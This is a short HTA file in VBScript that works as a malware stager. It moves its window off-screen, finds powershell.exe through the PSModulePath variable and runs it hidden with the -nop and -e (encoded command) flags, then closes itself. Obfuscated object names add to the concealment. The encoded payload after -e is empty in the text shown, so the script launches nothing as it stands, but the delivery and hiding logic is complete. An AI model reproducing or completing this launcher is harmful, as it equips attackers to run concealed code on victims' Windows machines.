<script language="VBScript">
  window.moveTo -4000, -4000
  Set ckd7nbpPJTC = CreateObject("Wscript.Shell")
  Set ewIn = CreateObject("Scripting.FileSystemObject")
  For each path in Split(ckd7nbpPJTC.ExpandEnvironmentStrings("%PSModulePath%"),";")
    If ewIn.FileExists(path + "\..\powershell.exe") Then
      ckd7nbpPJTC.Run "powershell.exe -nop -w hidden -e ",0
      Exit For
    End If
  Next
  window.close()
</script>
